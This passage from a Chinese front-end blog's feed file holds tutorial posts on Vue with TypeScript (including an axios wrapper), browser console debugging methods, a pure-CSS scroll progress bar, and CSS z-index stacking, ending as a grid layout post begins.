<p>除此之外，还需要修改shims-vue.d.ts<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">module</span> 'vue/types/vue' &#123;</span><br><span class="line">  <span class="keyword">interface</span> Vue &#123;</span><br><span class="line">        readonly $i18n: VueI18Next;</span><br><span class="line">        $t: TranslationFunction;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样就能正常使用了</p>
</blockquote>
<h4 id="AXIOS封装"><a href="#AXIOS封装" class="headerlink" title="AXIOS封装"></a>AXIOS封装</h4><blockquote>
<p>我们在项目中使用axios的时候，一般都会将其封装一层，设置好baseURL、请求、响应、通用错误处理等。在TS中封装其实也差不太多，主要是要加上类型</p>
</blockquote>
<ul>
<li>新建service.ts<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> &#123; AxiosResponse, AxiosRequestConfig &#125; <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"><span class="keyword">const</span> baseURL = <span class="string">'/api'</span></span><br><span class="line"><span class="keyword">const</span> service = axios.default.create(&#123;</span><br><span class="line">  baseURL,</span><br><span class="line">  timeout: <span class="number">0</span>,</span><br><span class="line">  maxContentLength: <span class="number">4000</span></span><br><span class="line">&#125;)</span><br><span class="line">service.interceptors.request.use(<span class="function">(<span class="params">config: AxiosRequestConfig</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> config</span><br><span class="line">&#125;, <span class="function">(<span class="params">error: <span class="built_in">any</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">&#125;)</span><br><span class="line">service.interceptors.response.use(</span><br><span class="line">  (response: AxiosResponse) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (response.status !== <span class="number">200</span>) &#123;</span><br><span class="line">      Vue.prototype.$message(&#123;</span><br><span class="line">        message: <span class="string">'网络错误'</span>,</span><br><span class="line">        <span class="keyword">type</span>: <span class="string">'error'</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> response.data</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  (error: <span class="built_in">any</span>) =&gt; &#123;</span><br><span class="line">    <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> service</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>有些地方还习惯将常用的http方法也封装一层 这里就简化了 没进行这一步了</p>
</blockquote>
<ul>
<li>新建api.ts</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> service <span class="keyword">from</span> <span class="string">'./request'</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">getSomeThings</span>(<span class="params">params: object</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> service(&#123;</span><br><span class="line">      url: <span class="string">'/login'</span>,</span><br><span class="line">      method: <span class="string">'post'</span>,</span><br><span class="line">      data: params</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// post</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">postSomeThings</span>(<span class="params">params: object</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> service(&#123;</span><br><span class="line">    url: <span class="string">'/api/getSomethings'</span>,</span><br><span class="line">    method: <span class="string">'post'</span>,</span><br><span class="line">    data: params</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><blockquote>
<p><a href="https://ts.xcatliu.com/" target="_blank" rel="noopener">TypeScript入门教程</a><br><a href="https://juejin.im/post/5d8efeace51d45782b0c1bd6" target="_blank" rel="noopener">TypeScript安利指南</a><br><a href="https://juejin.im/post/5d19ad6de51d451063431864" target="_blank" rel="noopener">为 Vue3 学点 TypeScript , 体验 TypeScript</a><br><a href="https://juejin.im/post/5d53a8895188257fad671cbc" target="_blank" rel="noopener">一篇朴实的文章带你30分钟捋完TypeScript,方法是正反对比</a><br><a href="https://cn.vuejs.org/v2/guide/typescript.html" target="_blank" rel="noopener">Vue官网介绍</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Vue</category>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>console的调试技巧</title>
    <url>/2019/12/20/console%E7%9A%84%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;console是我么日常工作和学习中用到的最多的一个调试方法，而我们最常用的仅仅是console.log，在查阅文档和别人的介绍博客之后才知道原来其中还包含了挺多方法的，而且有一些还挺实用的，下面就简单的介绍一下这些方法:<br><a id="more"></a></p>
<h4 id="console-log"><a href="#console-log" class="headerlink" title="console.log"></a>console.log</h4><blockquote>
<p>这是我们最常用的方法，对我自己来说最常用来打印一个或者多个变量的值，这里就不再赘述了。主要来讲一下其他用法</p>
</blockquote>
<ul>
<li>格式化打印<blockquote>
<p>%s: 字符串占位符<br>%d: 整数占位符<br>%f: 浮点数占位符<br>%o: 对象占位符<br>%c: CSS样式占位符</p>
</blockquote>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串</span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="string">'my name is %s'</span>, <span class="string">'sxb'</span>)</span><br><span class="line"> <span class="comment">// 整数</span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="string">'my age is %d'</span>, <span class="number">12</span>)</span><br><span class="line"> <span class="comment">// 浮点数</span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="string">'It cost %f'</span>, <span class="number">22.5</span>)</span><br><span class="line"> <span class="comment">// 对象</span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="string">'my obj is %o'</span>, &#123;<span class="attr">text</span>: <span class="string">'hello'</span>&#125;)</span><br><span class="line"> <span class="comment">// CSS</span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="string">'I like eat %c%s'</span>, <span class="string">'color:red'</span>, <span class="string">'cookie'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/consolelog1.png" alt="My Pic"></p>
<h4 id="console-warn"><a href="#console-warn" class="headerlink" title="console.warn"></a>console.warn</h4><blockquote>
<p>用法和console.log基本一致，只是该条打印信息属于警告级别，浏览器会做区别处理，并且会加入到警告信息中背景颜色和文字颜色会和普通的有所区别</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.warn(<span class="string">'It is a warning message'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/consolelog2.png" alt="My Pic"></p>
<h4 id="console-dir"><a href="#console-dir" class="headerlink" title="console.dir"></a>console.dir</h4><blockquote>
<p>在打印结果中和console.log对于对象的返回会有一定的区别。用到最多的就是用它来打印dom对象。</p>
<ul>
<li>普通对象<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span> &#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj)</span><br><span class="line"><span class="built_in">console</span>.dir(obj)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<p><img src="/images/consolelog3.png" alt="My Pic"></p>
<ul>
<li>dom对象<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.body)</span><br><span class="line"><span class="built_in">console</span>.dir(<span class="built_in">document</span>.body)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/images/consolelog4.png" alt="My Pic"></p>
<h4 id="console-table"><a href="#console-table" class="headerlink" title="console.table"></a>console.table</h4><blockquote>
<p>我们在工作中经常会遇到需要调试后端返回的数组或者比较复杂的对象，这个时候就可以使用console.table，让我们能更加好的展示数据，不用自己去点。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = [</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">  <span class="built_in">console</span>.log(obj)</span><br><span class="line">  <span class="built_in">console</span>.table(obj)</span><br></pre></td></tr></table></figure>
<p><img src="/images/consolelog5.png" alt="My Pic"></p>
<ul>
<li>除此之外 这个方法还能传其他参数，第二个可选参数用于筛选表格需要显示的列，默认为全部列都显示。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = [</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'sxb'</span>, <span class="attr">age</span>: <span class="number">12</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">  <span class="built_in">console</span>.log(obj)</span><br><span class="line">  <span class="built_in">console</span>.table(obj, [<span class="string">'name'</span>])</span><br></pre></td></tr></table></figure>
<p><img src="/images/consolelog6.png" alt="My Pic"></p>
<h4 id="console-assert"><a href="#console-assert" class="headerlink" title="console.assert"></a>console.assert</h4><blockquote>
<p>assert这个单词相信大家也不会陌生，就断言的意思。这个方法只有当第一个参数表达式为false时才会输出,并且作为错误提示</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.assert(<span class="number">1</span> &lt; <span class="number">2</span>, <span class="string">'hahahaha you are wrong'</span>)</span><br><span class="line"> <span class="built_in">console</span>.assert(<span class="number">1</span> &gt; <span class="number">2</span>, <span class="string">'hahahaha you are wrong'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/consolelog7.png" alt="My Pic"></p>
<h4 id="console-trace"><a href="#console-trace" class="headerlink" title="console.trace"></a>console.trace</h4><blockquote>
<p>这个方法自己之前还没了解过，查了之后才知道该方法用于在控制台中显示当前代码在堆栈中的调用路径，通过这个调用路径我们可以很容易地在发生错误时找到原始错误点，下面就看一个例子吧</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (data === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.trace();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar1</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> foo(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar2</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> foo(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar1(&#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;); <span class="comment">// -&gt; [1, 2]</span></span><br><span class="line">bar2(<span class="literal">null</span>); <span class="comment">// -&gt; []</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/consolelog8.png" alt="My Pic"></p>
<blockquote>
<p>我们从代码的逻辑看，首先调用的bar1 而bar1中又会调用foo。接着调用bar2中的foo，直到我们console.trace的地方。追踪到的路径就为 foo - bar2</p>
</blockquote>
<h4 id="console-count"><a href="#console-count" class="headerlink" title="console.count"></a>console.count</h4><blockquote>
<p>简单来讲这个方法就是一个计数器.用于记录调用次数，并将记录结果打印到控制台中。其接收一个可选参数console.count(label)，label表示指定标签，该标签会在调用次数之前显示。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.count(<span class="string">'label'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/consolelog9.png" alt="My Pic"></p>
<h4 id="console-time-和-console-timeEnd"><a href="#console-time-和-console-timeEnd" class="headerlink" title="console.time 和 console.timeEnd"></a>console.time 和 console.timeEnd</h4><blockquote>
<p>这两个是关于时间打印的方法，需要配合起来使用。console.time方法是作为计算的起始时间，console.timeEnd是作为计算的结束时间，并将执行时长显示在控制台。如果一个页面有多个地方需要使用到计算器，则可以为方法传入一个可选参数label来指定标签，该标签会在执行时间之前显示。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sum = <span class="number">0</span></span><br><span class="line"><span class="built_in">console</span>.time()</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">  sum += sum</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.timeEnd()</span><br></pre></td></tr></table></figure>
<p><img src="/images/consolelog10.png" alt="My Pic"></p>
<p>*当没有传递参数时则会默认default参数名</p>
<h4 id="检查DOM元素"><a href="#检查DOM元素" class="headerlink" title="检查DOM元素"></a>检查DOM元素</h4><blockquote>
<p>控制台提供了inspect()方法让我们可以直接从控制台中检查一个DOM元素。</p>
<p>inspect($(‘selector’))：将检查与选择器匹配的元素，并且会自动跳转到Chrome Developer Tools的Elements选项卡中。例如inspect($(‘#content’))将检查id为content的元素</p>
</blockquote>
<p><img src="/images/consolelog11.gif" alt="My Pic"></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>css 进度条</title>
    <url>/2019/01/14/css-%E8%BF%9B%E5%BA%A6%E6%9D%A1/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;昨天在掘金上看到了一篇文章，讲得利用css实现滚动条的进度，纯css实现实现。看到里面用的东西其实自己也用过，但是没想到还可以这么玩 哈哈 所以说还是学无止境呀 还是要多多学习。先看看最终的代码吧<br><a id="more"></a><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>css进度<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">		*&#123;</span></span><br><span class="line"><span class="undefined">			margin:0;</span></span><br><span class="line"><span class="undefined">			padding:0;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">		body &#123;</span></span><br><span class="line"><span class="undefined">	    background-image: linear-gradient(to right top, #ffcc00 50%, #eee 50%);</span></span><br><span class="line"><span class="undefined">	    background-size: 100% calc(100% - 100vh + 5px);</span></span><br><span class="line"><span class="undefined">	    background-repeat: no-repeat;</span></span><br><span class="line"><span class="undefined">     &#125;</span></span><br><span class="line"><span class="undefined">     p&#123;</span></span><br><span class="line"><span class="undefined">     	font-size: 20px;</span></span><br><span class="line"><span class="undefined">     	margin-top:50px;</span></span><br><span class="line"><span class="undefined">     &#125;</span></span><br><span class="line"><span class="undefined">	body::after &#123;</span></span><br><span class="line"><span class="undefined">    content: "";</span></span><br><span class="line"><span class="undefined">    position: fixed;</span></span><br><span class="line"><span class="undefined">    top: 5px;</span></span><br><span class="line"><span class="undefined">    left: 0;</span></span><br><span class="line"><span class="undefined">    bottom: 0;</span></span><br><span class="line"><span class="undefined">    right: 0;</span></span><br><span class="line"><span class="undefined">    background: #fff;</span></span><br><span class="line"><span class="undefined">    z-index: -1;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>hahahahhhahahahhahahhahhahaaahhaha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>其实这段代码主要是利用了css的background-image属性 实现了从屏幕对半分的一个渐变背景图片，当划到最低端是发现渐变颜色已经占满块80%了，在通过调整背景的size使之刚好在滑到底部时刚好占满最上部，再通过使用一个伪元素将多余部分的背景颜色给遮住，在设置z-index：-1，让它不挡住正文的内容。于是就使用css实现了一个滚动的进度条</p>
]]></content>
      <categories>
        <category>Css</category>
      </categories>
      <tags>
        <tag>Css</tag>
      </tags>
  </entry>
  <entry>
    <title>css中的层叠水平</title>
    <url>/2018/11/19/css%E4%B8%AD%E7%9A%84%E5%B1%82%E5%8F%A0%E6%B0%B4%E5%B9%B3/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;之前呢 对css的层叠水平大概只知道一个z-index，有些时候就会乱用，并且会出现修改z-index无效的效果。然后自己去学习了一下css的层叠水平和层叠上下文。<br>下面是一些例子<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先是比较block和inline</span><br><span class="line">&lt;span style=&quot;width:50px;height:100px;background-color: red;margin-top:10px;&quot;&gt;xxxxx&lt;/span&gt;</span><br><span class="line">&lt;p style=&quot;width:100px;height:50px; background-color: blue;margin-top:-10px;&quot;&gt;</span><br><span class="line">这里的结果是span元素会盖在p元素上面，并没有遵循后来的会覆盖在前面</span><br><span class="line">在没有其他元素干扰的情况下inline的默认层叠水平高于block</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/z1.png" alt="My Pic"><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> .father&#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    width:200px;</span><br><span class="line">    height:400px;</span><br><span class="line">    background-color: green;</span><br><span class="line">&#125;</span><br><span class="line">.son1&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top:0px;</span><br><span class="line">    width:250px;</span><br><span class="line">    height:120px;</span><br><span class="line">    background-color: antiquewhite;</span><br><span class="line">    z-index:-2;</span><br><span class="line">&#125;</span><br><span class="line">.son2&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top:0px;</span><br><span class="line">    width:220px;</span><br><span class="line">    height:100px;</span><br><span class="line">    background-color: red;</span><br><span class="line">    z-index:-1;</span><br><span class="line">&#125; </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"father"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"son1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"son2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">这里父元素会盖在子元素上，但是给父元素加上z-index属性之后，子元素又会盖在父元素上。第一种情况是由于父元素与子元素没有建立层叠上下文，遵循层叠顺序所以父元素会显出来，第二种的话由于建立了层叠上下文，子元素就会在夫元素上。</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/z2.png" alt="My Pic"><br><img src="/images/z3.png" alt="My Pic"><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> .father1&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left:50px;</span><br><span class="line">    width:300px;</span><br><span class="line">    height:300px;</span><br><span class="line">    background:pink;</span><br><span class="line">    z-index:auto;</span><br><span class="line">&#125;</span><br><span class="line">.father2&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left:100px;</span><br><span class="line">    width:300px;</span><br><span class="line">    height:300px;</span><br><span class="line">    background:red;</span><br><span class="line">    z-index:auto;</span><br><span class="line">&#125;</span><br><span class="line">.son1&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left:0px;</span><br><span class="line">    top:50px;</span><br><span class="line">    width:120px;</span><br><span class="line">    height:100px;</span><br><span class="line">    background-color: blue;</span><br><span class="line">    z-index:2;</span><br><span class="line">&#125;</span><br><span class="line">.son2&#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left:50px;</span><br><span class="line">    top:50px;</span><br><span class="line">    width:100px;</span><br><span class="line">    height:100px;</span><br><span class="line">    background-color: yellow;</span><br><span class="line">    z-index:1;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"father1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"son1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"father2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"son2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">这里说明互相比较的时候，如果父与子建立了层叠上下文先看父元素的层叠水平大小，再看子元素的层叠水平</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/z4.png" alt="My Pic"><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.box &#123;  &#125;</span><br><span class="line">.box &gt; div &#123; background-color: blue;z-index:1; &#125;   </span><br><span class="line">.box &gt; div &gt; img &#123; </span><br><span class="line">  position: relative; z-index: -1; right: -50px;width:100px;height:100px; </span><br><span class="line">&#125; </span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1.jpg"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">这个例子 当父元素dispaly为flex时，子元素没有定位的z-index也会生效</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/z5.png" alt="My Pic"><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.box &#123; background-color: blue;transform: translate(-100px,0);z-index:1;position: relative; &#125;</span><br><span class="line">.box &gt; img &#123;</span><br><span class="line">    position: relative; z-index: -99; right: -50px;width:100px;height:100px; </span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1.jpg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">这里说明transform属性会使z-index元素失效</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>Css</tag>
      </tags>
  </entry>
  <entry>
    <title>grid布局</title>
    <url>/2019/08/04/grid%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;一直知道css中存在这个属性，以及它能够很方便的布局，但是感觉自己使用flex基本上也够用了，就没去仔细的学习。但是今天突然想看看grid的庐山真面目。<br><a id="more"></a></p>
<h3 id="1-容器属性"><a href="#1-容器属性" class="headerlink" title="1.容器属性"></a>1.容器属性</h3><blockquote>
